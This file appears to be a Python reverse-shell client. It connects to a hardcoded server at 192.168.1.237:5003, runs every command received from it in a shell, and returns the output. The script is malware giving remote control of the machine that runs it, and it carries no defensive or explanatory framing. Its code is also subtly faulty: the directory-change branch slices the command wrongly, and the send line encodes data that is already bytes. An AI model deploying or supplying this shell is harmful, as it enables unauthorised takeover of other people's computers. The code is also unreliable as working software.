import socket
import subprocess
import os

SERVER_HOST = "192.168.1.237"   # Server IP
SERVER_PORT = 5003 # Server Port
BUFFER_SIZE = 1024 # Buffer Size


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((SERVER_HOST, SERVER_PORT))

while True:
    command = s.recv(BUFFER_SIZE)
    if command[:2].decode("utf-8") == 'cd':
        os.chdir(command[:3].decode("utf-8"))
    if len(command) > 0:
        cmd = subprocess.Popen(command[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()     
        s.send(str.encode(output_bytes)) 
